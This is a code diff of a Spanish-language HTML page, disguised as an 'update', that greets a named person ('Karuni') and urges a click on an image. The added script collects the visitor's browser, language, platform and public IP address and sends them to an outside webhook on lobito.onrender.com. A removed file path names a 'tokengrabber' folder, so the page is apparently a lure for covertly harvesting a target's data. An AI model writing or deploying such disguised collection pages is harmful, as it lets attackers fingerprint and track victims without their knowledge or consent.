@@ -14,42 +14,43 @@
   <title>Actualización</title>
 </head>
 <body>
+  <h1>Hola Karuni</h1>
+  <p>Click en la imagen para iniciar...</p>
+  
   <a href="https://lobito.onrender.com/index.html">
-    <img src="https://lobito.onrender.com/Sinulo.png" alt="Haz clic aquí" style="width:100%; max-width:600px;" />
+    <img src="https://lobito.onrender.com/Sinulo.png" alt="Haz clic aquí" style="width:100%; max-width:600px;" onclick="extraer()" />
   </a>
-</body>
-</head>
-<body>
-    <h1>Hola Karuni</h1>
-    <p>Click en la imagen para iniciar...</p>
-    <img src="C:\Users\HP PC\Downloads\tokengrabber\dist\Sinulo.png" onclick="extraer()">
 
-<script>
-    const data = {
+  <script>
+    function extraer() {
+      const data = {
         navegador: navigator.userAgent,
         idioma: navigator.language,
         plataforma: navigator.platform
-    };
+      };
 
-    fetch('https://api.ipify.org?format=json')
+      fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
         .then(ipData => {
-            data.ip = ipData.ip;
+          data.ip = ipData.ip;
 
-            // Enviar a tu backend en Render
-            fetch("https://tubackend.onrender.com/webhook", {
-                method: "POST",
-                headers: {"Content-Type": "application/json"},
-                body: JSON.stringify(data)
-            })
-            .then(res => res.text())
-            .then(resp => {
-                alert("Datos enviados correctamente.");
-                console.log(resp);
-            })
-            .catch(err => {
-                alert("Error al enviar datos.");
-                console.error(err);
-            });
+          // Enviar a tu backend en Render
+          fetch("https://lobito.onrender.com/webhook", {
+              method: "POST",
+              headers: {"Content-Type": "application/json"},
+              body: JSON.stringify(data)
+          })
+          .then(res => res.text())
+          .then(resp => {
+              alert("Datos enviados correctamente.");
+              console.log(resp);
+          })
+          .catch(err => {
+              alert("Error al enviar datos.");
+              console.error(err);
+          });
         });
-</script>
+    }
+  </script>
+</body>
+</html>
